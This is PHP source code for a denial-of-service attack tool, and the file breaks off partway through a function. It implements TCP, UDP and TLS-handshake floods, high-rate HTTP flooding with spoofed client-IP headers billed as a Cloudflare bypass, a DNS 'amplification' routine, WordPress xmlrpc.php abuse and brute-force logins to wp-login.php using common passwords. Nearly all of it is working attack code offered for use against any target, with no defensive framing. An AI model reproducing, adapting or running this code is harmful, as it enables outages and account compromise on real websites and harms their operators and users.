<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
ini_set('max_execution_time', 0);
ini_set('memory_limit', '-1');
set_time_limit(0);
ignore_user_abort(true);

define('CLI_MODE', php_sapi_name() === 'cli');

class AttackMethods {
    const FLOOD = 'FLOOD';
    const SLOW = 'SLOW';
    const RUDY = 'RUDY';
    const HULK = 'HULK';
    const GEYE = 'GEYE';
    const MIXED = 'MIXED';
    const SSL = 'SSL';
    const HTTP2 = 'HTTP2';
    const TCP = 'TCP';
    const UDP = 'UDP';
    const SYN = 'SYN';
    const ACK = 'ACK';
    const FIN = 'FIN';
    const RST = 'RST';
    const XMAS = 'XMAS';
    const UDP_KILL = 'UDP-KILL';
    const JS_FLOOD = 'JS-FLOOD';
    const TLS_FLOOD = 'TLS-FLOOD';
    const CACHE_POISON = 'CACHE-POISON';
    const WEBSOCKET_STRESS = 'WEBSOCKET';
    const DNS_AMPLIFICATION = 'DNS-AMP';
    const BROWSER_SIM = 'BROWSER-SIM';
    const HTTP_OBSF = 'HTTP-OBSF';
    const POST_FLOOD = 'POST-FLOOD';
    const GET_FLOOD = 'GET-FLOOD';
    const HEAD_FLOOD = 'HEAD-FLOOD';
    const OPTIONS_FLOOD = 'OPTIONS-FLOOD';
    const XMLRPC = 'XMLRPC';
    const WP_LOGIN = 'WP-LOGIN';
    const API_FLOOD = 'API-FLOOD';
    const CLOUDFLARE_BYPASS = 'CF-BYPASS';
    const RANK = 'RANK';
}

class OutputManager {
    public static function write($message, $newline = true) {
        if (CLI_MODE) {
            if (defined('SILENT_MODE') && SILENT_MODE) return;
            echo $message . ($newline ? PHP_EOL : '');
        } else {
            echo $message . ($newline ? '<br>' : '');
            flush();
        }
    }
    public static function writeError($message) { self::write("[ERROR] $message"); }
    public static function writeInfo($message) { self::write("[INFO] $message"); }
    public static function writeSuccess($message) { self::write("[SUCCESS] $message"); }
}

class UserAgentGenerator {
    private static $platforms = [
        ['Windows NT 10.0; Win64; x64', 'Windows'],
        ['Windows NT 6.3; Win64; x64', 'Windows'],
        ['Macintosh; Intel Mac OS X 10_15_7', 'Mac'],
        ['X11; Linux x86_64', 'Linux'],
        ['X11; Ubuntu; Linux x86_64', 'Linux'],
        ['X11; Fedora; Linux x86_64', 'Linux'],
        ['iPhone; CPU iPhone OS 14_0 like Mac OS X', 'iOS'],
        ['Android 10; Mobile', 'Android'],
        ['Android 11; SM-G973F', 'Android']
    ];
    
    public static function generate() {
        $platform = self::$platforms[array_rand(self::$platforms)];
        $browser_type = mt_rand(0, 100);
        if ($browser_type < 60) return self::generateChrome($platform);
        elseif ($browser_type < 85) return self::generateFirefox($platform);
        elseif ($browser_type < 95) return self::generateSafari($platform);
        else return self::generateEdge($platform);
    }
    
    private static function generateChrome($platform) {
        $chrome_versions = ['122.0.6261.111', '121.0.6167.140', '120.0.6099.217', '119.0.6045.200'];
        $chrome_ver = $chrome_versions[array_rand($chrome_versions)];
        return "Mozilla/5.0 ({$platform[0]}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{$chrome_ver} Safari/537.36";
    }
    
    private static function generateFirefox($platform) {
        $ff_versions = ['122.0', '121.0', '120.0', '119.0'];
        $ff_ver = $ff_versions[array_rand($ff_versions)];
        return "Mozilla/5.0 ({$platform[0]}; rv:{$ff_ver}.0) Gecko/20100101 Firefox/{$ff_ver}.0";
    }
    
    private static function generateSafari($platform) {
        $safari_versions = ['17.3', '17.2', '17.1', '16.6'];
        $safari_ver = $safari_versions[array_rand($safari_versions)];
        return "Mozilla/5.0 ({$platform[0]}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{$safari_ver} Safari/605.1.15";
    }
    
    private static function generateEdge($platform) {
        $edge_versions = ['122.0.2365.92', '121.0.2277.112', '120.0.2210.144'];
        $edge_ver = $edge_versions[array_rand($edge_versions)];
        return "Mozilla/5.0 ({$platform[0]}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{$edge_ver} Edg/{$edge_ver}";
    }
}

class SessionManager {
    private static $sessions = [];
    private static $session_counter = 0;
    
    public static function createSession() {
        $session_id = 'sess_' . self::$session_counter++ . '_' . bin2hex(random_bytes(12));
        self::$sessions[$session_id] = [
            'cookies' => self::generateSessionCookies($session_id),
            'created' => microtime(true),
            'requests' => 0,
            'last_activity' => time()
        ];
        return $session_id;
    }
    
    private static function generateSessionCookies($session_id) {
        return [
            'PHPSESSID' => $session_id,
            'session_token' => bin2hex(random_bytes(24)),
            'user_id' => mt_rand(10000000, 99999999),
            'csrf_token' => bin2hex(random_bytes(16)),
            'visit_id' => 'vid_' . time() . '_' . mt_rand(1000, 9999),
            'lang' => mt_rand(0, 1) ? 'en' : 'ar',
            'theme' => mt_rand(0, 1) ? 'dark' : 'light'
        ];
    }
    
    public static function getCookies($session_id) {
        if (!isset(self::$sessions[$session_id])) $session_id = self::createSession();
        self::$sessions[$session_id]['requests']++;
        self::$sessions[$session_id]['last_activity'] = time();
        $cookies = self::$sessions[$session_id]['cookies'];
        $cookies['request_count'] = self::$sessions[$session_id]['requests'];
        $cookies['session_age'] = time() - strtotime('today');
        $cookie_string = '';
        foreach ($cookies as $name => $value) $cookie_string .= "$name=$value; ";
        return rtrim($cookie_string, '; ');
    }
    
    public static function getActiveSessionsCount() {
        return count(self::$sessions);
    }
}

class RequestManager {
    private static $request_counter = 0;
    
    public static function generateHeaders($session_id = null) {
        $user_agent = UserAgentGenerator::generate();
        $headers = [
            "User-Agent" => $user_agent,
            "Accept" => "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language" => "en-US,en;q=0.9,ar;q=0.8,fr;q=0.7",
            "Accept-Encoding" => "gzip, deflate, br",
            "Connection" => "keep-alive",
            "Upgrade-Insecure-Requests" => "1",
            "Cache-Control" => mt_rand(0, 1) ? "max-age=0" : "no-cache",
            "Sec-Fetch-Dest" => "document",
            "Sec-Fetch-Mode" => "navigate",
            "Sec-Fetch-Site" => "none",
            "Sec-Fetch-User" => "?1",
            "Pragma" => mt_rand(0, 1) ? "no-cache" : ""
        ];
        
        if (strpos($user_agent, 'Chrome') !== false) {
            $chrome_version = explode('Chrome/', $user_agent)[1];
            $chrome_version = explode('.', $chrome_version)[0];
            $headers["Sec-Ch-Ua"] = '"Google Chrome";v="' . $chrome_version . '", "Chromium";v="' . $chrome_version . '", "Not=A?Brand";v="24"';
            $headers["Sec-Ch-Ua-Mobile"] = mt_rand(0, 1) ? "?0" : "?1";
            $headers["Sec-Ch-Ua-Platform"] = '"' . (mt_rand(0, 1) ? "Windows" : "Linux") . '"';
        }
        
        if ($session_id) {
            $cookies = SessionManager::getCookies($session_id);
            if ($cookies) $headers["Cookie"] = $cookies;
        }
        
        if (mt_rand(0, 100) > 30) {
            $referers = [
                "https://www.google.com/", 
                "https://www.bing.com/", 
                "https://www.facebook.com/",
                "https://twitter.com/",
                "https://www.youtube.com/",
                "https://www.reddit.com/",
                ""
            ];
            $headers["Referer"] = $referers[array_rand($referers)];
        }
        
        $keys = array_keys($headers);
        shuffle($keys);
        $final = [];
        foreach ($keys as $k) if (!empty($headers[$k])) $final[] = "$k: " . $headers[$k];
        return $final;
    }
    
    public static function generateRequestData() {
        self::$request_counter++;
        return [
            '_' => time() . mt_rand(100, 999),
            't' => microtime(true),
            'r' => self::$request_counter,
            'v' => mt_rand(1, 1000000),
            'rand' => bin2hex(random_bytes(4))
        ];
    }
}

function setup_curl_handle($url, $session_id = null, $use_post = false, $custom_method = null) {
    $ch = curl_init();
    
    if ($use_post) {
        $post_data = RequestManager::generateRequestData();
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post_data));
    } elseif ($custom_method) {
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $custom_method);
    } else {
        $query_data = RequestManager::generateRequestData();
        $url_with_query = $url . (strpos($url, '?') !== false ? '&' : '?') . http_build_query($query_data);
        curl_setopt($ch, CURLOPT_URL, $url_with_query);
    }
    
    $headers = RequestManager::generateHeaders($session_id);
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_TIMEOUT => 15,
        CURLOPT_CONNECTTIMEOUT => 2,
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_TCP_KEEPALIVE => 1,
        CURLOPT_TCP_NODELAY => true,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_2_0,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS => 2,
        CURLOPT_ENCODING => "gzip, deflate",
        CURLOPT_HEADER => false,
        CURLOPT_NOBODY => false
    ]);
    
    return $ch;
}

function tcp_flood_attack($host, $port, $threads, $duration) {
    $start_time = microtime(true);
    $end_time = $start_time + $duration;
    $total_packets = 0;
    OutputManager::write("[TCP] Starting flood on $host:$port with $threads threads");
    
    while (microtime(true) < $end_time) {
        for ($i = 0; $i < $threads; $i++) {
            $socket = @fsockopen($host, $port, $errno, $errstr, 1);
            if ($socket) {
                fwrite($socket, str_repeat("X", 2048));
                fclose($socket);
                $total_packets++;
            }
        }
        usleep(10000);
    }
    return $total_packets;
}

function udp_kill_attack($host, $port, $threads, $duration) {
    $start_time = microtime(true);
    $end_time = $start_time + $duration;
    $total_packets = 0;
    OutputManager::write("[UDP-KILL] Starting on $host:$port with $threads threads");
    
    while (microtime(true) < $end_time) {
        for ($i = 0; $i < $threads; $i++) {
            $socket = @fsockopen("udp://$host", $port, $errno, $errstr, 1);
            if ($socket) {
                $packet = random_bytes(1024);
                for ($j = 0; $j < 10; $j++) {
                    fwrite($socket, $packet);
                    $total_packets++;
                }
                fclose($socket);
            }
        }
        usleep(1000);
    }
    return $total_packets;
}

function js_flood_attack($target_url, $duration, $threads) {
    $start_time = microtime(true);
    $end_time = $start_time + $duration;
    $total_requests = 0;
    $multi_handles = [];
    
    OutputManager::write("[JS-FLOOD] Starting JavaScript simulation flood");
    
    $num_pools = min(5, ceil($threads / 1000));
    for ($i = 0; $i < $num_pools; $i++) {
        $multi_handles[$i] = curl_multi_init();
        for ($j = 0; $j < min(1000, $threads); $j++) {
            $session_id = SessionManager::createSession();
            $ch = setup_curl_handle($target_url, $session_id, false);
            curl_setopt($ch, CURLOPT_TIMEOUT, 3);
            curl_multi_add_handle($multi_handles[$i], $ch);
        }
    }
    
    while (microtime(true) < $end_time) {
        foreach ($multi_handles as $mh) {
            $active = null;
            curl_multi_exec($mh, $active);
            
            while ($info = curl_multi_info_read($mh)) {
                $ch = $info['handle'];
                curl_multi_remove_handle($mh, $ch);
                curl_close($ch);
                $total_requests++;
                
                $session_id = SessionManager::createSession();
                $new_ch = setup_curl_handle($target_url, $session_id, false);
                curl_setopt($new_ch, CURLOPT_TIMEOUT, 3);
                curl_multi_add_handle($mh, $new_ch);
            }
            curl_multi_select($mh, 0.001);
        }
        
        if (mt_rand(0, 100) > 95) {
            $elapsed = microtime(true) - $start_time;
            $rps = round($total_requests / $elapsed);
            OutputManager::write("[JS-FLOOD] RPS: $rps | Total: " . number_format($total_requests));
        }
    }
    
    foreach ($multi_handles as $mh) curl_multi_close($mh);
    return $total_requests;
}

function tls_flood_attack($host, $port, $threads, $duration) {
    $start_time = microtime(true);
    $end_time = $start_time + $duration;
    $total_connections = 0;
    OutputManager::write("[TLS-FLOOD] Starting TLS handshake flood on $host:$port");
    
    while (microtime(true) < $end_time) {
        for ($i = 0; $i < $threads; $i++) {
            $context = stream_context_create([
                'ssl' => [
                    'verify_peer' => false,
                    'verify_peer_name' => false,
                    'ciphers' => 'ALL:@SECLEVEL=0'
                ]
            ]);
            
            $socket = @stream_socket_client("ssl://$host:$port", $errno, $errstr, 1, STREAM_CLIENT_CONNECT, $context);
            if ($socket) {
                fwrite($socket, "GET / HTTP/1.1\r\nHost: $host\r\n\r\n");
                fclose($socket);
                $total_connections++;
            }
        }
        usleep(5000);
    }
    return $total_connections;
}

function cache_poison_attack($target_url, $duration, $threads) {
    $start_time = microtime(true);
    $end_time = $start_time + $duration;
    $total_requests = 0;
    $url_parts = parse_url($target_url);
    $host = $url_parts['host'];
    
    OutputManager::write("[CACHE-POISON] Starting cache poisoning attack on $host");
    
    $unique_paths = [];
    for ($i = 0; $i < 100; $i++) {
        $unique_paths[] = '/' . bin2hex(random_bytes(8)) . '.html';
    }
    
    while (microtime(true) < $end_time) {
        $multi_handle = curl_multi_init();
        $handles = [];
        
        for ($i = 0; $i < $threads; $i++) {
            $session_id = SessionManager::createSession();
            $path = $unique_paths[array_rand($unique_paths)];
            $url = $url_parts['scheme'] . '://' . $host . $path;
            
            $ch = curl_init();
            $headers = RequestManager::generateHeaders($session_id);
            $headers[] = "X-Forwarded-Host: " . bin2hex(random_bytes(4)) . ".com";
            $headers[] = "X-Original-URL: " . $path;
            
            curl_setopt_array($ch, [
                CURLOPT_URL => $url,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_HTTPHEADER => $headers,
                CURLOPT_TIMEOUT => 5,
                CURLOPT_SSL_VERIFYPEER => false
            ]);
            
            curl_multi_add_handle($multi_handle, $ch);
            $handles[] = $ch;
        }
        
        $active = null;
        do {
            curl_multi_exec($multi_handle, $active);
        } while ($active > 0);
        
        foreach ($handles as $ch) {
            curl_multi_remove_handle($multi_handle, $ch);
            curl_close($ch);
            $total_requests++;
        }
        
        curl_multi_close($multi_handle);
        
        if (mt_rand(0, 100) > 90) {
            OutputManager::write("[CACHE-POISON] Requests: " . number_format($total_requests));
        }
        
        usleep(10000);
    }
    return $total_requests;
}

function dns_amplification_attack($dns_server, $target, $duration, $threads) {
    $start_time = microtime(true);
    $end_time = $start_time + $duration;
    $total_queries = 0;
    
    OutputManager::write("[DNS-AMP] Starting DNS amplification attack via $dns_server to $target");
    
    $domains = [
        'isc.org', 'google.com', 'facebook.com', 'youtube.com', 'amazon.com',
        'microsoft.com', 'twitter.com', 'instagram.com', 'linkedin.com'
    ];
    
    while (microtime(true) < $end_time) {
        for ($i = 0; $i < $threads; $i++) {
            $domain = $domains[array_rand($domains)];
            $packet = random_bytes(512);
            $socket = @fsockopen("udp://$dns_server", 53, $errno, $errstr, 1);
            if ($socket) {
                fwrite($socket, $packet);
                fclose($socket);
                $total_queries++;
            }
        }
        usleep(1000);
    }
    return $total_queries;
}

function browser_sim_attack($target_url, $duration, $threads) {
    $start_time = microtime(true);
    $end_time = $start_time + $duration;
    $total_requests = 0;
    
    OutputManager::write("[BROWSER-SIM] Starting browser simulation attack");
    
    $urls_to_hit = [];
    $base_url = parse_url($target_url, PHP_URL_SCHEME) . '://' . parse_url($target_url, PHP_URL_HOST);
    
    for ($i = 0; $i < 20; $i++) {
        $urls_to_hit[] = $base_url . '/' . bin2hex(random_bytes(4)) . '.html';
        $urls_to_hit[] = $base_url . '/wp-content/uploads/' . date('Y/m') . '/' . bin2hex(random_bytes(6)) . '.jpg';
        $urls_to_hit[] = $base_url . '/api/' . bin2hex(random_bytes(4));
        $urls_to_hit[] = $base_url . '/ajax/' . bin2hex(random_bytes(4));
    }
    
    while (microtime(true) < $end_time) {
        $multi_handle = curl_multi_init();
        $handles = [];
        
        for ($i = 0; $i < $threads; $i++) {
            $session_id = SessionManager::createSession();
            $url = $urls_to_hit[array_rand($urls_to_hit)];
            
            $ch = curl_init();
            $headers = RequestManager::generateHeaders($session_id);
            $headers[] = "X-Requested-With: XMLHttpRequest";
            
            curl_setopt_array($ch, [
                CURLOPT_URL => $url,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_HTTPHEADER => $headers,
                CURLOPT_TIMEOUT => 4,
                CURLOPT_REFERER => $target_url
            ]);
            
            curl_multi_add_handle($multi_handle, $ch);
            $handles[] = $ch;
        }
        
        $active = null;
        curl_multi_exec($multi_handle, $active);
        
        foreach ($handles as $ch) {
            curl_multi_remove_handle($multi_handle, $ch);
            curl_close($ch);
            $total_requests++;
        }
        
        curl_multi_close($multi_handle);
        
        if (mt_rand(0, 100) > 95) {
            $elapsed = microtime(true) - $start_time;
            $rps = round($total_requests / $elapsed);
            OutputManager::write("[BROWSER-SIM] RPS: $rps | Total: " . number_format($total_requests));
        }
        
        usleep(5000);
    }
    return $total_requests;
}

function cloudflare_bypass_attack($target_url, $duration, $threads) {
    $start_time = microtime(true);
    $end_time = $start_time + $duration;
    $total_requests = 0;
    
    OutputManager::write("[CF-BYPASS] Starting CloudFlare bypass attack");
    
    $user_agents = [];
    for ($i = 0; $i < 50; $i++) {
        $user_agents[] = UserAgentGenerator::generate();
    }
    
    $ips = [];
    for ($i = 0; $i < 100; $i++) {
        $ips[] = mt_rand(1, 255) . '.' . mt_rand(1, 255) . '.' . mt_rand(1, 255) . '.' . mt_rand(1, 255);
    }
    
    while (microtime(true) < $end_time) {
        $multi_handle = curl_multi_init();
        $handles = [];
        
        for ($i = 0; $i < $threads; $i++) {
            $ch = curl_init();
            
            $headers = [
                "User-Agent: " . $user_agents[array_rand($user_agents)],
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language: en-US,en;q=0.5",
                "Accept-Encoding: gzip, deflate",
                "Connection: keep-alive",
                "Upgrade-Insecure-Requests: 1",
                "Cache-Control: max-age=0",
                "X-Forwarded-For: " . $ips[array_rand($ips)],
                "X-Real-IP: " . $ips[array_rand($ips)],
                "CF-Connecting-IP: " . $ips[array_rand($ips)]
            ];
            
            $url = $target_url . '?' . http_build_query(['_cf' => time() . mt_rand(100, 999)]);
            
            curl_setopt_array($ch, [
                CURLOPT_URL => $url,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_HTTPHEADER => $headers,
                CURLOPT_TIMEOUT => 3,
                CURLOPT_SSL_VERIFYPEER => false,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_MAXREDIRS => 5
            ]);
            
            curl_multi_add_handle($multi_handle, $ch);
            $handles[] = $ch;
        }
        
        $active = null;
        curl_multi_exec($multi_handle, $active);
        
        while ($info = curl_multi_info_read($multi_handle)) {
            curl_multi_remove_handle($multi_handle, $info['handle']);
            curl_close($info['handle']);
            $total_requests++;
        }
        
        curl_multi_close($multi_handle);
        
        if (mt_rand(0, 100) > 90) {
            $elapsed = microtime(true) - $start_time;
            $rps = round($total_requests / $elapsed);
            OutputManager::write("[CF-BYPASS] RPS: $rps | Total: " . number_format($total_requests));
        }
        
        usleep(2000);
    }
    return $total_requests;
}

function xmlrpc_attack($target_url, $duration, $threads) {
    $start_time = microtime(true);
    $end_time = $start_time + $duration;
    $total_requests = 0;
    $xmlrpc_url = rtrim($target_url, '/') . '/xmlrpc.php';
    
    OutputManager::write("[XMLRPC] Starting XML-RPC attack on $xmlrpc_url");
    
    $xml_payloads = [
        '<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>password123</value></param></params></methodCall>',
        '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>',
        '<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value>http://example.com</value></param><param><value>' . $target_url . '</value></param></params></methodCall>'
    ];
    
    while (microtime(true) < $end_time) {
        $multi_handle = curl_multi_init();
        $handles = [];
        
        for ($i = 0; $i < $threads; $i++) {
            $ch = curl_init();
            $payload = $xml_payloads[array_rand($xml_payloads)];
            
            $headers = [
                "User-Agent: " . UserAgentGenerator::generate(),
                "Content-Type: text/xml",
                "Connection: close",
                "Content-Length: " . strlen($payload)
            ];
            
            curl_setopt_array($ch, [
                CURLOPT_URL => $xmlrpc_url,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_POST => true,
                CURLOPT_POSTFIELDS => $payload,
                CURLOPT_HTTPHEADER => $headers,
                CURLOPT_TIMEOUT => 3
            ]);
            
            curl_multi_add_handle($multi_handle, $ch);
            $handles[] = $ch;
        }
        
        $active = null;
        curl_multi_exec($multi_handle, $active);
        
        foreach ($handles as $ch) {
            curl_multi_remove_handle($multi_handle, $ch);
            curl_close($ch);
            $total_requests++;
        }
        
        curl_multi_close($multi_handle);
        
        if (mt_rand(0, 100) > 95) {
            OutputManager::write("[XMLRPC] Requests: " . number_format($total_requests));
        }
        
        usleep(10000);
    }
    return $total_requests;
}

function wp_login_attack($target_url, $duration, $threads) {
    $start_time = microtime(true);
    $end_time = $start_time + $duration;
    $total_requests = 0;
    $login_url = rtrim($target_url, '/') . '/wp-login.php';
    
    OutputManager::write("[WP-LOGIN] Starting WordPress login attack on $login_url");
    
    $usernames = ['admin', 'administrator', 'wordpress', 'user', 'test', 'demo'];
    $passwords = ['password', '123456', 'admin123', 'wordpress', 'test123', 'password123'];
    
    while (microtime(true) < $end_time) {
        $multi_handle = curl_multi_init();
        $handles = [];
        
        for ($i = 0; $i < $threads; $i++) {
            $ch = curl_init();
            $username = $usernames[array_rand($usernames)];
            $password = $passwords[array_rand($passwords)];
            
            $post_data = [
                'log' => $username,
                'pwd' => $password,
                'wp-submit' => 'Log In',
                'redirect_to' => $target_url,
                'testcookie' => '1'
            ];
            
            $headers = [
                "User-Agent: " . UserAgentGenerator::generate(),
                "Content-Type: application/x-www-form-urlencoded",
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
            ];
            
            curl_setopt_array($ch, [
                CURLOPT_URL => $login_url,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_POST => true,
                CURLOPT_POSTFIELDS => http_build_query($post_data),
                CURLOPT_HTTPHEADER => $headers,
                CURLOPT_TIMEOUT => 4,
                CURLOPT_COOKIEJAR => '/dev/null',
                CURLOPT_FOLLOWLOCATION => true
            ]);
            
            curl_multi_add_handle($multi_handle, $ch);
            $handles[] = $ch;
        }
        
        $active = null;
        curl_multi_exec($multi_handle, $active);
        
        foreach ($handles as $ch) {
            curl_multi_remove_handle($multi_handle, $ch);
            curl_close($ch);
            $total_requests++;
        }
        
        curl_multi_close($multi_handle);
        
        if (mt_rand(0, 100) > 90) {
            OutputManager::write("[WP-LOGIN] Requests: " . number_format($total_requests));
        }
        
        usleep(15000);
    }
    return $total_requests;
}

function rank_attack($target_url, $duration, $threads) {
    $start_time = microtime(true);
    $end_time = $start_time + $duration;
    $total_requests = 0;
    $peak_rps = 0;
    
    OutputManager::write("[RANK] Starting RANK attack - Maximum RPS mode");
    OutputManager::write("[RANK] Target: $target_url | Threads: $threads | Duration: {$duration}s");
    
    $num_pools = min(10, ceil($threads / 500));
    $multi_handles = [];
    $connections_per_pool = floor($threads / $num_pools);
    
    for ($p = 0; $p < $num_pools; $p++) {
        $multi_handles[$p] = curl_multi_init();
        curl_multi_setopt($multi_handles[$p], CURLMOPT_PIPELINING, CURLPIPE_HTTP1 | CURLPIPE_MULTIPLEX);
        curl_multi_setopt($multi_handles[$p], CURLMOPT_MAX_HOST_CONNECTIONS, 5000);
        curl_multi_setopt($multi_handles[$p], CURLMOPT_MAX_TOTAL_CONNECTIONS, 5000);
        
        for ($i = 0; $i < $connections_per_pool; $i++) {
            $ch = curl_init();
            $url = $target_url . '?__rank=' . time() . '_' . mt_rand(100000, 999999);
            
            curl_setopt_array($ch, [
                CURLOPT_URL => $url,
                CURLOPT_RETURNTRANSFER => false,
                CURLOPT_SSL_VERIFYPEER => false,
                CURLOPT_SSL_VERIFYHOST => false,
                CURLOPT_TIMEOUT => 1,
                CURLOPT_CONNECTTIMEOUT => 1,
                CURLOPT_NOBODY => true,
                CURLOPT_HEADER => false,
                CURLOPT_FOLLOWLOCATION => false,
                CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
                CURLOPT_TCP_NODELAY => true,
                CURLOPT_TCP_KEEPALIVE => false
            ]);
            
            curl_multi_add_handle($multi_handles[$p], $ch);
        }
    }
    
    $last_stats_time = $start_time;
    $requests_last_second = 0;
    $last_second_time = $start_time;
    
    OutputManager::write("[RANK] Initialized $num_pools pools with " . ($connections_per_pool * $num_pools) . " connections");
    
    while (microtime(true) < $end_time) {
        $current_time = microtime(true);
        
        foreach ($multi_handles as $p => $mh) {
            $active = null;
            curl_multi_exec($mh, $active);
            
            while ($info = curl_multi_info_read($mh)) {
                $ch = $info['handle'];
                curl_multi_remove_handle($mh, $ch);
                curl_close($ch);
                $total_requests++;
                $requests_last_second++;
                
                $new_ch = curl_init();
                $url = $target_url . '?__rank=' . time() . '_' . mt_rand(100000, 999999);
                
                curl_setopt_array($new_ch, [
                    CURLOPT_URL => $url,
                    CURLOPT_RETURNTRANSFER => false,
                    CURLOPT_SSL_VERIFYPEER => false,
                    CURLOPT_SSL_VERIFYHOST => false,
                    CURLOPT_TIMEOUT => 1,
                    CURLOPT_CONNECTTIMEOUT => 1,
                    CURLOPT_NOBODY => true,
                    CURLOPT_HEADER => false
                ]);
                
                curl_multi_add_handle($mh, $new_ch);
            }
        }
        
        if ($current_time - $last_second_time >= 1.0) {
            $current_rps = $requests_last_second;
            $peak_rps = max($peak_rps, $current_rps);
            $requests_last_second = 0;
            $last_second_time = $current_time;
            
            if ($current_time - $last_stats_time >= 2.0) {
                $elapsed = $current_time - $start_time;
                $avg_rps = round($total_requests / $elapsed);
                $mem_usage = round(memory_get_usage(true) / 1024 / 1024, 2);
                
                OutputManager::write("[RANK] RPS: $current_rps | Peak: $peak_rps | Avg: $avg_rps | Total: " . 
                     number_format($total_requests) . " | Mem: {$mem_usage}MB");
                $last_stats_time = $current_time;
            }
        }
        
        usleep(100);
    }
    
    foreach ($multi_handles as $mh) {
        $active = null;
        curl_multi_exec($mh, $active);
        while ($info = curl_multi_info_read($mh)) {
            curl_multi_remove_handle($mh, $info['handle']);
            curl_close($info['handle']);
        }
        curl_multi_close($mh);
    }
    
    $final_elapsed = microtime(true) - $start_time;
    $final_avg_rps = round($total_requests / $final_elapsed);
    
    OutputManager::write("[RANK] ATTACK COMPLETED");
    OutputManager::write("[RANK] Peak RPS: $peak_rps");
    OutputManager::write("[RANK] Average RPS: $final_avg_rps");
    OutputManager::write("[RANK] Total Requests: " . number_format($total_requests));
    OutputManager::write("[RANK] Total Time: " . round($final_elapsed, 2) . "s");
    
    return $total_requests;
}

function execute_attack($target, $duration, $threads, $method, $mode = 'NON', $port = 80) {
    if (ob_get_level()) ob_end_clean();
    
    OutputManager::write("[ATTACK] Starting: $method on $target for {$duration}s with $threads threads");
    
    $start_time = microtime(true);
    $result = 0;
    
    $layer4_methods = [AttackMethods::TCP, AttackMethods::UDP, AttackMethods::SYN, 
                      AttackMethods::ACK, AttackMethods::FIN, AttackMethods::RST, AttackMethods::XMAS];
    
    $layer7_methods = [AttackMethods::FLOOD, AttackMethods::SLOW, AttackMethods::RUDY, 
                      AttackMethods::HULK, AttackMethods::GEYE, AttackMethods::MIXED,
                      AttackMethods::SSL, AttackMethods::HTTP2, AttackMethods::JS_FLOOD,
                      AttackMethods::CACHE_POISON, AttackMethods::BROWSER_SIM,
                      AttackMethods::HTTP_OBSF, AttackMethods::POST_FLOOD,
                      AttackMethods::GET_FLOOD, AttackMethods::HEAD_FLOOD,
                      AttackMethods::OPTIONS_FLOOD, AttackMethods::XMLRPC,
                      AttackMethods::WP_LOGIN, AttackMethods::API_FLOOD,
                      AttackMethods::CLOUDFLARE_BYPASS, AttackMethods::RANK];
    
    if (in_array($method, $layer4_methods)) {
        $host = parse_url($target, PHP_URL_HOST) ?: $target;
        
        switch($method) {
            case AttackMethods::TCP:
                $result = tcp_flood_attack($host, $port, $threads, $duration);
                break;
            case AttackMethods::UDP:
            case AttackMethods::UDP_KILL:
                $result = udp_kill_attack($host, $port, $threads, $duration);
                break;
            case AttackMethods::SYN:
                $result = syn_flood_attack($host, $port, $threads, $duration);
                break;
            default:
                $result = tcp_flood_attack($host, $port, $threads, $duration);
        }
    } elseif (in_array($method, $layer7_methods)) {
        switch($method) {
            case AttackMethods::JS_FLOOD:
                $result = js_flood_attack($target, $duration, $threads);
                break;
            case AttackMethods::TLS_FLOOD:
                $host = parse_url($target, PHP_URL_HOST) ?: $target;
                $result = tls_flood_attack($host, $port, $threads, $duration);
                break;
            case AttackMethods::CACHE_POISON:
                $result = cache_poison_attack($target, $duration, $threads);
                break;
            case AttackMethods::DNS_AMPLIFICATION:
                $dns_server = '8.8.8.8';
                $result = dns_amplification_attack($dns_server, $target, $duration, $threads);
                break;
            case AttackMethods::BROWSER_SIM:
                $result = browser_sim_attack($target, $duration, $threads);
                break;
            case AttackMethods::CLOUDFLARE_BYPASS:
                $result = cloudflare_bypass_attack($target, $duration, $threads);
                break;
            case AttackMethods::XMLRPC:
                $result = xmlrpc_attack($target, $duration, $threads);
                break;
            case AttackMethods::WP_LOGIN:
                $result = wp_login_attack($target, $duration, $threads);
                break;
            case AttackMethods::RANK:
                $result = rank_attack($target, $duration, $threads);
                break;
            default:
                execute_http_attack($target, $duration, $threads, $method, $mode);
                $result = 0;
        }
    } else {
        execute_http_attack($target, $duration, $threads, $method, $mode);
    }
    
    $elapsed = microtime(true) - $start_time;
    OutputManager::write("[ATTACK] Finished in " . round($elapsed, 2) . "s | Result: " . number_format($result));
}

function execute_http_attack($target_url, $duration, $threads, $method, $mode = 'NON') {
    $multi_handles = [];
    $session_pools = [];
    $start_time = microtime(true);
    $end_time = $start_time + $duration;
    $total_requests = 0;
    $failed_requests = 0;
    
    $num_pools = min(3, ceil($threads / 4000));
    $sockets_per_pool = floor($threads / $num_pools);
    
    for ($i = 0; $i < $num_pools; $i++) {
        $multi_handles[$i] = curl_multi_init();
        curl_multi_setopt($multi_handles[$i], CURLMOPT_PIPELINING, 3);
        curl_multi_setopt($multi_handles[$i], CURLMOPT_MAX_HOST_CONNECTIONS, 1000);
